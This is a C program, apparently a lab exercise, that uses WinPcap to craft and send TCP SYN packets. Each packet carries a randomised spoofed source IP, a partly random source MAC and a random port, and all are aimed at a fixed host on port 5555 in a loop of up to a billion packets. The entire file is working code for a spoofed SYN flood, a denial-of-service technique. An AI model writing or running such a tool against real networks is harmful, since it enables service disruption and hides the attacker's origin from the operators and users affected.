#define HAVE_REMOTE
#define _CRT_SECURE_NO_WARNINGS   //禁用不安全警告
#pragma comment(lib, "wpcap.lib") //未设置附加依赖项的时候写入该条
#pragma comment(lib, "ws2_32.lib")
#pragma  warning(disable:4996)//用于取消边界检查错误提示

#include <stdio.h>
#include "pcap.h"
#include<stdlib.h>
#include "Win32-Extensions.h"


struct Eth_header  //共14字节
{
	unsigned char   DstMac[6];//目标MAC地址 6字节
	unsigned char   SrcMac[6];//源MAC地址 6字节
	unsigned short  ProType;  //如果上一层为IP协议。则ether_type的值就是0x0800  
}EthHeader;

struct Ip_Header  //共20字节（不含选项）
{
	unsigned char VerisonHeadlen;    //Version+IHL报头长度(各4bit,共1字节)     
	unsigned char ServerType;       //Server Type(1字节)       
	unsigned short TotalLength;         //Packet Length(2字节)报头和数据部分的总长度以字节为单位       
	unsigned short ident;         //Identification分段标识(2字节)
	unsigned short FlagOffset;    //flag标识位(3bit)+Fragment Offset分段偏移(13bit)       
	unsigned char ttl;           //Time to Live生存周期(1字节),hop为单位       
	unsigned char proto;         //protocol上层协议位(1字节)0x06->TCP,0x11->UDP,0x01->ICMP          
	unsigned short checksum;    //Header Checksum报头校验和(2字节)用于检验IP报头是否出错，不能检验数据部分
	unsigned long SrcIpAddress; //源IP(4字节)  
	unsigned long DstIpAddress; //目的IP(4字节)
	//Options选项（4字节整数倍，不足则由其后Paddings位置若干0补齐）
}IpHeader;

struct Tcp_Header  //20字节+若干选项
{
	unsigned short SrcPort;    //源端口（2字节
	unsigned short DstPort;    //目的端口（2字节)
	unsigned long  SeqNum;     //Sequence Number序列号(4字节)
	unsigned long  AckNum;      //Acknowledgment number确认号(4字节)
	unsigned short HeadlenFlags; //Header Length(6bit)+Flags(10bit).Flag用于设置TCP包类型
	unsigned short WinSize;       //Window Size(2字节)
	unsigned short checksum;     //Tcp Checksum(2字节)
	unsigned short UrgPoi;        //Urgent pointer(2字节)不用时置0
	//Options以4字节为单位，各项用0x01间隔，末尾不足4字节用0x01补齐.不用时可不填
	unsigned long options[3];

}TcpHeader;

struct Psd_Header    //TCP/UDP伪头部 共14字节
{
	unsigned long  SrcIpAddress;    //源IP(4字节)  
	unsigned long  DstIpAddress;    //目的IP(4字节)
	unsigned char  PutZero;         //置0(1字节)  
	unsigned char  ProType;        //四层协议类型(1字节)
	unsigned short TcpLenth;       //TCP/UDP数据包的长度(即从TCP/UDP报头算起到数据包结束的长度 单位:字节)  
}PsdHeader;


USHORT checksum(USHORT *buffer, int size)//校验和计算函数
{
	unsigned long cksum = 0;
	while (size>1)
	{
		cksum += *buffer++;
		size -= sizeof(USHORT);
	}
	if (size)
	{
		cksum += *(UCHAR *)buffer;
	}
	//将32位数转换成16
	while (cksum >> 16)
		cksum = (cksum >> 16) + (cksum & 0xffff);
	return (USHORT)(~cksum);
}

/*生成数据包*/
void gen_packet(unsigned char *buf,int n)
{
	
	
	//填充数据链链路层
	EthHeader.DstMac[0] = 0x00;
	EthHeader.DstMac[1] = 0x0c;
	EthHeader.DstMac[2] = 0x29;
	EthHeader.DstMac[3] = 0x35;
	EthHeader.DstMac[4] = 0x2b;
	EthHeader.DstMac[5] = 0x1c;

	EthHeader.SrcMac[0] = 0x00;
	EthHeader.SrcMac[1] = 0x50;
	EthHeader.SrcMac[2] = 0x56;
	EthHeader.SrcMac[3] = rand() % 256;
	EthHeader.SrcMac[4] = rand() % 256;
	EthHeader.SrcMac[5] = rand() % 256;
	EthHeader.ProType = htons(0x0800);

	
	char src_ip[20] = { 0 };
	sprintf(src_ip, "%d.%d.%d.%d", rand() % 256, rand() % 256, rand() % 256, rand() % 256);//构造随机ip
	//填充网络层
	IpHeader.VerisonHeadlen = 0x45;
	IpHeader.ServerType = 0x00;
	IpHeader.TotalLength = htons(sizeof(IpHeader)+sizeof(TcpHeader));//填充IP头部中的总长部分，TCP报文作为其数据部分
	IpHeader.ident = htons(0x0001);
	IpHeader.FlagOffset = htons(0x4000);
	IpHeader.ttl = 0x40;
	IpHeader.proto = 0x06;
	IpHeader.checksum = htons(0x0000);
	IpHeader.SrcIpAddress = inet_addr(src_ip);
	IpHeader.DstIpAddress = htonl(0xc0a8c682);

	IpHeader.checksum = checksum((USHORT*)&IpHeader, sizeof(IpHeader));//IP校验和计算因给checksum的输入已是网络字节序，所以无须再转换


	//填充传输层
	TcpHeader.SrcPort = htons(1024+rand());
	TcpHeader.DstPort = htons(0x15b3);
	TcpHeader.SeqNum = htonl(0x00000001+rand());
	TcpHeader.AckNum = htonl(0x00000000);
	TcpHeader.HeadlenFlags = htons(0x8002);//0x02表示SYN包
	TcpHeader.WinSize = htons(0x2000);
	TcpHeader.checksum = 0x0000;//21bf
	TcpHeader.UrgPoi = htons(0x0000);
	TcpHeader.options[0] = htonl(0x020405b4);//MASS
	TcpHeader.options[1] = htonl(0x01030302);//Window Scale 0x01用于间隔
	TcpHeader.options[2] = htonl(0x01010402);//第一个0x01用于与Windows Scale选项构成四字节，第二个用于间隔

	//填充伪头部
	PsdHeader.SrcIpAddress = IpHeader.SrcIpAddress;
	PsdHeader.DstIpAddress = IpHeader.DstIpAddress;
	PsdHeader.PutZero = 0x00;
	PsdHeader.ProType = IpHeader.proto;
	PsdHeader.TcpLenth = htons(sizeof(TcpHeader));

	unsigned char *tem = (unsigned char *)malloc(sizeof(PsdHeader)+sizeof(TcpHeader));
	memcpy(tem, &PsdHeader, sizeof(PsdHeader));
	memcpy(tem + sizeof(PsdHeader), &TcpHeader, sizeof(TcpHeader));
	TcpHeader.checksum = checksum((USHORT*)tem, sizeof(PsdHeader)+sizeof(TcpHeader));//计算并填充TCP校验和

	free(tem);//释放中间内存


	//拼接各层数据并传给发包时的参数buf
	memcpy(buf, &EthHeader, sizeof(EthHeader));
	memcpy(buf + sizeof(EthHeader), &IpHeader, sizeof(IpHeader));
	memcpy(buf + sizeof(EthHeader)+sizeof(IpHeader), &TcpHeader, sizeof(TcpHeader));


		


}


int main()
{
	pcap_if_t *alldevs;//用于出储存适配器详细信息的结构体
	pcap_if_t *d;
	int inum;
	int i = 0;
	pcap_t *adhandle;//提供对一个已打开适配器的描述
	char errbuf[PCAP_ERRBUF_SIZE];//储存发生错误时的错误信息
	int ret = -1;

	/* 获取本机网络设备列表 */
	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}

	/* 打印网络设备列表 */
	for (d = alldevs; d != NULL; d = d->next)
	{
		printf("%d. %s", ++i, d->name);
		if (d->description)
			printf(" (%s)\n", d->description);
		else
			printf(" (No description available)\n");
	}

	if (i == 0)
	{
		printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
		return -1;
	}

	/*选择网络设备接口*/
	printf("Enter the interface number (1-%d):", i);
	scanf("%d", &inum);

	if (inum < 1 || inum > i)
	{
		printf("\nInterface number out of range.\n");
		/* 释放设备列表 */
		pcap_freealldevs(alldevs);
		return -1;
	}

	/* 跳转到选中的适配器 */
	for (d = alldevs, i = 0; i< inum - 1; d = d->next, i++);//d一开始指向链表的头部,要逐级向下跳转

	/* 打开设备 */
	if ((adhandle = pcap_open(d->name,          // 设备名                      
		65536,            // 65535保证能捕获到数据链路层上每个数据包的全部内容
		PCAP_OPENFLAG_PROMISCUOUS,    // 混杂模式
		1000,             // 读取超时时间
		NULL,             // 远程机器验证
		errbuf            // 错误缓冲池
		)) == NULL)
	{
		fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name);

		/* 释放设备列表 */
		pcap_freealldevs(alldevs);
		return -1;
	}

	/*在选中的设备接口上发送数据*/
	printf("\nsending on %s...\n", d->description);

	/* 发送数据包*/
	
	int packetlen = sizeof(EthHeader)+sizeof(IpHeader)+sizeof(TcpHeader);
	unsigned char *buf = (unsigned char *)malloc(packetlen);//生成数据报空间
	memset(buf, 0x0, packetlen);//给数据包末尾加0用


	for (int n = 0; n < 1000000000; n++)//发送n个不同的包
	{
		gen_packet(buf,n); //获得生成的数据包
		//开始数据包发送	
		if ((ret = pcap_sendpacket(adhandle, buf, packetlen)) == -1)
		{
			printf("发送失败\n");
			free(buf);
			pcap_close(adhandle);
			pcap_freealldevs(alldevs);
			return -1;
		}

		Sleep(300);

	}






	/*释放资源*/
	free(buf);
	pcap_close(adhandle);
	pcap_freealldevs(alldevs);

	return 0;
}

